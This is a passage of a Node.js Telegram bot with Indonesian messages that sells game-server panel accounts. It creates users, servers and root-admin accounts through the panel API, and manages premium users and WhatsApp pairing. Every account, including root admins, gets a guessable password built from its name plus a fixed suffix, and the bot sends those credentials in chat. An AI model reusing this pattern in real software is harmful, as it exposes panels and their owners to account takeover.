    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
√ Login : ${domain}
√ Username : ${user.username}
√ Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "unli";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.OTAX`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel KingOtax");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// createadmin
bot.onText(/\/createadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
  }
  const commandParams = match[1].split(",");
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(
      chatId,
      "Format Salah! Penggunaan: /createadmin namapanel,idtele"
    );
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.OTAX`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
TYPE: user
➟ ID: ${user.id}
➟ USERNAME: ${user.username}
➟ EMAIL: ${user.email}
➟ NAME: ${user.first_name} ${user.last_name}
➟ LANGUAGE: ${user.language}
➟ ADMIN: ${user.root_admin}
➟ CREATED AT: ${user.created_at}
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(
      telegramId,
      `
┏━⬣❏「 INFO DATA ADMIN PANEL 」❏
│➥  Login : ${domain}
│➥  Username : ${user.username}
│➥  Password : ${password} 
┗━━━━━━━━━⬣
│ Rules : 
│• Jangan Curi Sc
│• Jangan Buka Panel Orang
│• Jangan Ddos Server
│• Kalo jualan sensor domainnya
│• Jangan Bagi² Panel Free!😡
┗━━━━━━━━━━━━━━━━━━⬣
ᴏᴛᴀx ʜᴇʀᴇ!
    `
    );
  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti."
    );
  }
});
  
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
     const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
  }
  let page = 1; 
  try {
    let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
      
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    let res = await f.json();
    let servers = res.data;
    let messageText = "Daftar server aktif yang dimiliki:\n\n";
    for (let server of servers) {
      let s = server.attributes;

      let f3 = await fetch(
        `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        }
      );
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;

      messageText += `ID Server: ${s.id}\n`;
      messageText += `Nama Server: ${s.name}\n`;
      messageText += `Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, messageText);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan dalam memproses permintaan.");
  }
});



bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
   if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "𝙇𝙪 𝙎𝙞𝙖𝙥𝙖 𝙈𝙚𝙠!? 𝙂𝙖 𝘼𝙙𝙖 𝙃𝙖𝙠 𝘽𝙪𝙖𝙩 𝙈𝙖𝙠𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙄𝙣𝙞×͜×");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 𝗦𝗮𝗹𝗮𝗵 𝗜𝗻𝗽𝘂𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗕𝗲𝗴𝗼, 𝗬𝗮𝗻𝗴 𝗯𝗲𝗻𝗲𝗿 /𝗮𝗱𝗱𝗮𝗱𝗺𝗶𝗻 (𝗶𝗱).");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗪𝗮𝗵𝗮𝗶 𝗕𝗮𝗽𝗮𝗸 𝗱𝗲𝗻𝗴𝗮𝗻 𝗜𝗱 ${userId} 𝗧𝗲𝗹𝗮𝗵 𝗠𝗲𝗻𝗷𝗮𝗱𝗶 𝗔𝗱𝗺𝗶𝗻`);
    } else {
        bot.sendMessage(chatId, `🙈 𝗕𝗲𝗴𝗼!? 𝗕𝗼𝗰𝗮𝗵 𝗶𝗻𝗶 ${userId} 𝗦𝘂𝗱𝗮𝗵 𝗝𝗮𝗱𝗶 𝗔𝗱𝗺𝗶𝗻!.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 𝗕𝗮𝗻𝗴𝗸𝗲!?𝗟𝘂 𝗦𝗶𝗮𝗽𝗮?.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 𝗢𝗶 𝗛𝗶𝘁𝗮𝗺!? 𝗦𝗮𝗹𝗮𝗵 𝗜𝗻𝗽𝘂𝘁 𝗬𝗮𝗻𝗴 𝗕𝗲𝗻𝗲𝗿 /𝗱𝗲𝗹𝗽𝗿𝗲𝗺 (𝗶𝗱)");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 𝗡𝗴𝗲𝘁𝗶𝗸 𝗬𝗮𝗻𝗴 𝗕𝗲𝗻𝗲𝗿 𝗖𝗼𝗸!? 𝗣𝗮𝗸𝗲 𝗔𝗻𝗴𝗸𝗮");
    }

    
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 𝗕𝘂𝘁𝗼 𝗜𝗷𝗼 ${userId} 𝗴𝗮𝗸 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗮𝗹𝗮𝗺 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`);
    }

    
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

   
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 𝗦𝗮𝗹𝗮𝗵 𝗞𝗶𝗺𝗮𝗸!? 𝗖𝗼𝗯𝗮 𝗨𝗹𝗮𝗻𝗴 𝗟𝗮𝗴𝗶.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 𝗣𝗲𝗹𝗲𝗿 𝗠𝗲𝗹𝗮𝗿!? 𝗜𝗻𝗽𝘂𝘁 𝗡𝘆𝗮 𝗦𝗮𝗹𝗮𝗵 𝗖𝗼𝗻𝘁𝗼𝗵 : /𝗱𝗲𝗹𝗮𝗱𝗺𝗶𝗻 60.");
    }

   
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 𝗖𝗶𝗲𝗲 𝗕𝗲𝗵𝗮𝘀𝗶𝗹 𝗠𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 ${userId} 𝗦𝗲𝗯𝗮𝗴𝗮𝗶 𝗔𝗱𝗺𝗶𝗻😎`);
    } else {
        bot.sendMessage(chatId, `🙈 𝗢𝗶 𝗞𝗶𝗺𝗮𝗸!? ${userId} 𝗕𝘂𝗸𝗮𝗻 𝗔𝗱𝗺𝗶𝗻! .`);
    }
});

bot.onText(/\/listpair/, async (msg) => {
    const chatId = msg.chat.id;
    const activeSessions = await loadActiveSessions();   
if (shouldIgnoreMessage(msg)) return;
if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}
    if (activeSessions.length === 0) {
        bot.sendMessage(chatId, 'ℹ️ Tidak ada sesi yang aktif saat ini.', { parse_mode: 'Markdown' });
    } else {
        const sessionList = activeSessions.map(session => `👤${session}`).join('\n');
        const messageText = `
*Daftar Sesi Aktif:*

${sessionList}

⁉️  Untuk menghapus sesi, gunakan \`/delpair\`
ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`;

        bot.sendMessage(chatId, messageText, { parse_mode: 'Markdown' });
    }
});
bot.onText(/\/delpair/, async (msg) => { // tambahkan 'async'
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}
    await clearSessionDirectory(); // gunakan 'await'
    bot.sendMessage(chatId, 'Semua Sender Dan File Sessions Sudah Dihapus\nᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙');
});
bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);
if (shouldIgnoreMessage(msg)) return;
    if (result.error) {
        bot.sendMessage(chatId, `🤬 ${result.error}`);
    } else {
        let teks = `
 *Informasi Channel WhatsApp*
 *ID:* ${result.id}
 *Nama:* ${result.name}
 *Total Pengikut:* ${result.subscribers}
 *Status:* ${result.status}
 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});
bot.onText(/\/groupon/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); // Aktifkan mode hanya grup
        await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});
bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    if (shouldIgnoreMessage(msg)) return;

    const repliedMessage = msg.reply_to_message;

    
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${username ? `@${username}` : 'Tidak ada'}
×͜× ID: \`${senderId}\`
╰────────────────⬣
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; 
    }

    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
╭━━「 INFO PENGGUNA 」━━━⬣
×͜× Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
×͜× ID: \`${repliedUserId}\`
×͜× Nama: \`${repliedFullName}\`
╰────────────────⬣
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});
bot.onText(/\/otax (.+)/, (msg, match) => {
    const messageText = match[1]; 
    sendNotifOwner(msg, `Pesan dari pengguna: ${messageText}`)
      .then(() => {
        bot.sendMessage(msg.chat.id, '𝘗𝘌𝘚𝘈𝘕 𝘈𝘕𝘋𝘈 𝘛𝘌𝘓𝘈𝘏 𝘋𝘐𝘒𝘐𝘙𝘐𝘔 𝘒𝘌 𝘖𝘛𝘈 𝘔𝘖𝘏𝘖𝘕 𝘋𝘐𝘛𝘜𝘕𝘎𝘎𝘜 𝘚𝘌𝘉𝘌𝘕𝘛𝘈𝘙\nᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙');
      })
      .catch(() => {
        bot.sendMessage(msg.chat.id, '𝘛𝘌𝘙𝘑𝘈𝘋𝘐 𝘒𝘌𝘚𝘈𝘓𝘈𝘏𝘈𝘕 𝘚𝘈𝘈𝘛 𝘔𝘌𝘕𝘎𝘐𝘙𝘐𝘔𝘒𝘈𝘕 𝘗𝘌𝘚𝘈𝘕.\nᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙');
      });
});

bot.onText(/\/groupoff/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); 
        await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});
// case enc
bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;   
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const userId = msg.from.id.toString();
     
     if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan /encjava
